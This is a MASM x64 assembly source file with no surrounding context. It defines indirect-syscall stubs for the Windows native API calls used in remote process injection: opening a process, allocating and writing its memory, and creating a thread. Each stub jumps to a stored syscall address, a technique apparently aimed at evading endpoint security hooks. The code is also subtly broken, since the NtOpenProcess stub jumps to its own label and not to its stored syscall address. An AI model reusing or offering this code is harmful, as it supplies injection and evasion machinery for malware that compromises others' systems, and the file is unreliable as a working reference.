

.data

EXTERN NtQuerySystemInformationSSN:DWORD
EXTERN NtQuerySystemInformationSyscall:QWORD

EXTERN NtOpenProcessSSN:DWORD
EXTERN NtOpenProcessSyscall:QWORD

EXTERN NtCloseSSN:DWORD
EXTERN NtCloseSyscall:QWORD


EXTERN NtCreateThreadSSN:DWORD
EXTERN NtCreateThreadSyscall:QWORD

EXTERN NtWriteVirtualMemorySSN:DWORD
EXTERN NtWriteVirtualMemorySyscall:QWORD

EXTERN NtWaitForSingleObjectSSN:DWORD
EXTERN NtWaitForSingleObjectSyscall:QWORD

EXTERN NtAllocateVirtualMemorySSN:DWORD
EXTERN NtAllocateVirtualMemorySyscall:QWORD


.code


NtClose proc
        mov r10, rcx
        mov eax, NtCloseSSN
        jmp qword ptr [NtCloseSyscall]
        ret
NtClose endp

NtCreateThreadEx proc
        mov r10, rcx
        mov eax, NtCreateThreadSSN
        jmp qword ptr [NtCreateThreadSyscall]
        ret
NtCreateThreadEx endp

NtWriteVirtualMemory proc
        mov r10, rcx
        mov eax, NtWriteVirtualMemorySSN
        jmp qword ptr [NtWriteVirtualMemorySyscall]
        ret
NtWriteVirtualMemory endp

NtWaitForSingleObject proc
        mov r10, rcx
        mov eax, NtWaitForSingleObjectSSN
        jmp qword ptr [NtWaitForSingleObjectSyscall]
        ret
NtWaitForSingleObject endp

NtAllocateVirtualMemory proc
        mov r10, rcx
        mov eax, NtAllocateVirtualMemorySSN
        jmp qword ptr [NtAllocateVirtualMemorySyscall]
        ret
NtAllocateVirtualMemory endp

NtOpenProcess proc
        mov r10, rcx
        mov eax, NtOpenProcessSSN
        jmp qword ptr [NtOpenProcess]
        ret
NtOpenProcess endp

NtQuerySystemInformation proc
        mov r10, rcx
        mov eax, NtQuerySystemInformationSSN
        jmp qword ptr [NtQuerySystemInformationSyscall]
        ret
NtQuerySystemInformation endp
end